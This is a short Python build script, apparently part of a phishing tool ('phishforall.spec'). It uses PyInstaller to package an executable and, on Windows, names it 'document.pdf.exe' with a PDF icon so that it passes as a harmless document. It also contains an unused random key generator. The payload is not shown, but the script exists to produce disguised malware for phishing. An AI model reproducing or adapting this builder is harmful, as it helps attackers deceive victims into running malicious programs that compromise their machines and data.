from os import path
from shutil import rmtree
from platform import system
from random import choice
from subprocess import check_call, PIPE


def gen_key(length=16):
    numbers = "0123456789"
    letters = "qwertyuiopasdfghjklzxcvbnm"
    chars = "".join(numbers + letters + letters.upper())

    return ''.join(choice(chars) for _ in range(length))

base_name = "document"

platform_name = system()

if platform_name == "Windows":
    icon_path = path.join("icons", "pdf.ico")
    name = "{}.pdf.exe".format(base_name)
elif platform_name == "Darwin":
    icon_path = path.join("icons", "pdf.ico")
    name = "{}".format(base_name)

if path.exists("dist"):
    rmtree("dist")
if path.exists("build"):
    rmtree("build")

#args = ["pyinstaller", "document.spec"]
args = ["pyinstaller", "phishforall.spec"]

check_call(args)
